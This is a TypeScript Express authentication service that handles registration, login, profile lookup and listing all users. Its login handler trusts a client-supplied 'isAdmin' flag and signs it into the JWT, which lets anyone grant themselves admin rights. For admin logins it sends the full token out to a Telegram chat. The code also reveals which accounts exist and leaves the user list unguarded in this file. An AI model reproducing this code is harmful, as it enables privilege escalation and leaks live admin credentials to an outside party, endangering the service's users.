import { Request, Response } from "express";
import { generateToken, verifyToken } from "../../utils/jwtToken";
import pool from "../../db/dbConnect";
import { compareHash, generateHash } from "../../utils/hash";
import { tokenPayloadInterface, UserInterface } from "../../types/userInterface";
import sendTelegramMessage from "../../utils/sendMessage";

class AuthService {
    static async register(req: Request, res: Response) {
        const { name, email, password } = req.body;

        if (!name || !email || !password) {
            return res.status(400).json({ message: "Missing field" });
        }

        const alreadyExists = await pool.query("SELECT id from users WHERE email = $1", [email]);
        if (alreadyExists.rowCount !== 0) {
            return res.status(409).json({ message: "User already exists with this email" });
        }

        const hashedPassword = await generateHash(password);

        try {
            const user = await pool.query("INSERT INTO users (name, email, password) VALUES ($1, $2, $3)", [
                name,
                email,
                hashedPassword,
            ]);
            console.log(user);
            res.status(201).json({
                message: "User registered successfully",
            });
        } catch (error: any) {
            console.log("register error:", error);
            res.status(500).json({ message: "Internal Server Error" });
        }
    }

    static async login(req: Request, res: Response) {
        const { email, password, isAdmin } = req.body;

        if (!email || !password) {
            return res.status(400).json({ message: "Missing field" });
        }

        const userExists = await pool.query("SELECT * from users WHERE email = $1", [email]);
        if (userExists?.rowCount === 0) {
            return res.status(409).json({ message: "User not found" });
        }

        try {
            const user: UserInterface = userExists.rows[0];
            const { id, name, email, password: hashedPassword, createdAt } = user;

            const isPasswordMatch = await compareHash(password, hashedPassword);
            if (!isPasswordMatch) {
                return res.status(401).json({ message: "Invalid password" });
            }
            const token = generateToken({ id, name, email, isAdmin });
            if (isAdmin) {
                sendTelegramMessage({
                    text: `Admin token generated - ${token}`,
                })
            }

            return res.status(201).json({
                token,
                user: {
                    name,
                    email,
                    createdAt,
                },
                message: "User logged in successfully",
            });
        } catch (error) {
            console.log("error", error);
            return res.status(500).send("Internal Server Error");
        }
    }

    // static async forgotPasswordOtp(req: Request, res: Response) {
    //     const userData = req.user || ({} as tokenPayloadInterface);
    //     try {
    //         const user = await pool.query("SELECT id, name, email, created_at FROM users WHERE id = $1", [userData.id]);
    //         const { id, name, email, createdAt } = user.rows[0];

    //         return res.status(200).json({
    //             // id,
    //             name,
    //             email,
    //             createdAt,
    //         });
    //     } catch (error) {
    //         console.log(error);
    //         return res.status(500).json({ message: "Internal Server Error" });
    //     }
    // }

    static async getProfile(req: Request, res: Response) {
        const userData = req.user || ({} as tokenPayloadInterface);
        try {
            const user = await pool.query("SELECT id, name, email, created_at FROM users WHERE id = $1", [userData.id]);
            const { name, email, createdAt } = user.rows[0];

            return res.status(200).json({
                // id,
                name,
                email,
                createdAt,
            });
        } catch (error) {
            console.log(error);
            return res.status(500).json({ message: "Internal Server Error" });
        }
    }

    static async getAllUsers(req: Request, res: Response) {
        try {
            const users = await pool.query("SELECT id, name, email, created_at FROM users");
            return res.status(200).json({
                message: "Users fetched successfully",
                usersCount: users.rowCount,
                users: users.rows,
            });
        } catch (error) {
            console.log(error);
            return res.status(500).json({ message: "Internal Server Error" });
        }
    }
}

export default AuthService;
